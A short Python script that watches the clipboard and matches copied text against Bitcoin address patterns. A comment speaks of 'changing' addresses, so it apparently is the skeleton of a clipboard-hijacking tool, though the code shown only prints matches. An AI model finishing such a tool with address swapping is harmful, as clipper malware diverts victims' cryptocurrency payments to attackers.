import pyperclip
import asyncio
import re

# For all possible BTC wallet configuration 
BTC_ADDRESS_MATCH = '([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})' # '([13]|bc1)[A-HJ-NP-Za-km-z1-9]{27,34}'


# Matching and changing btc function.
async def your_function(value):
  
    print(re.match(BTC_ADDRESS_MATCH , value))
        
    print(value)


async def wait4update(value):
    while True:
        if pyperclip.paste() != value : # If the clipboard changed.
            return

async def main():
    value = pyperclip.paste() # Set the default value.
    while True :
        update = asyncio.create_task(wait4update(value))
        await update
        value = pyperclip.paste() # Change the value.    
        asyncio.create_task(your_function(value)) #Start your function.

asyncio.run(main())

